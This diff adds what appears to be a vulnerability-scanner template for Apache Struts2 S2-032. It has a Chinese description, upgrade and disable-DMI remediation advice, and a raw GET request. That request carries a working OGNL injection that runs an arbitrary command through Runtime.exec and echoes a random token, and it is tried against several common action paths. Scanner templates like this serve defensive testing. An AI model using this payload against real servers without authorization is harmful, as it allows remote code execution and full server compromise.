@@ -1,0 +1,44 @@
+id: S2-032
+info:
+  name: Apache S2-032 Struts RCE
+  author:
+  - 折跃
+  description: |-
+    Struts2 S2-032 远程命令执行
+    当启用动态方法调用时，可以传递可用于在服务器端执行任意代码的恶意表达式。
+    method:<name> Action 前缀去调用声明为 public 的函数，只不过在低版本中 Strtus2 不会对 name 方法值做 OGNL 计算，而在高版本中会。
+  severity: critical
+  remediation: |-
+    #### 官方修复方案：
+    升级系统至无漏洞版本，或于官网下载安全补丁。
+    将Struts版本升级至Struts 2.3.20.2，2.3.24.2或者2.3.28.1来修复漏洞
+    新版本下载地址：[https://struts.apache.org/download.cgi#struts2328](https://struts.apache.org/download.cgi#struts2328)
+
+
+    #### 临时修复方案：
+    在配置文件中关闭动态方法调用（Dynamic Method Invocation）
+requests:
+- matchers:
+  - type: dsl
+    condition: and
+    dsl:
+    - status_code==200
+    - contains(body,verify)
+  raw:
+  - |
+    GET {{tmpPath}}?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.pp%5B0%5D),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B0%5D,%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&pp=%5C%5CA&ppp=%20&encoding=UTF-8&cmd=echo%20{{verify}} HTTP/1.1
+    Host: {{Hostname}}
+  attack: clusterbomb
+  payloads:
+    tmpPath:
+    - /
+    - /index.action
+    - /login.action
+    - /default.action
+    - /admin.action
+    - /user.action
+  redirects: true
+  req-condition: true
+  stop-at-first-match: true
+variables:
+  verify: '{{rand_text_alphanumeric(32,"")}}'
